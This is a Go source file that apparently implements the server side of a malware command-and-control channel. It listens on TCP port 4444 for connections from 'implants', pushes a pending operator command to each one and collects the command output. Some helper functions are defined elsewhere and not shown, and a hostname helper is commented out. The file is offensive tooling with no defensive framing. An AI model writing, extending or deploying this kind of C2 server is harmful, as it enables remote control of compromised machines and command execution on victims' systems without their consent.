package main

import (
	"bufio"
	"log"
	"net"
)

func initalizeServer() {
	listen, err := net.Listen("tcp", ":4444")
	if err != nil {
		log.Fatal("[-] Error", err)
	}

	defer listen.Close()

	for {
		conn, err := listen.Accept()
		if err != nil {
			log.Println("[-] Error accepting connection")
			continue
		}

		go handleImplants(conn)
	}
}

/* func GetHostname(reader *bufio.Reader) string {
	hostname, err := reader.ReadString('\n')
	if err != nil {
		return "unknown"
	}
	return strings.TrimSpace(hostname)

} */

func handleImplants(conn net.Conn) {
	defer conn.Close()
	reader := bufio.NewReader(conn)
	reader.ReadString('\n')

	if pendingCommand != "" {
		sendCommands(conn)
		pendingCommand = ""
		receiveOutput(reader)
	}
}
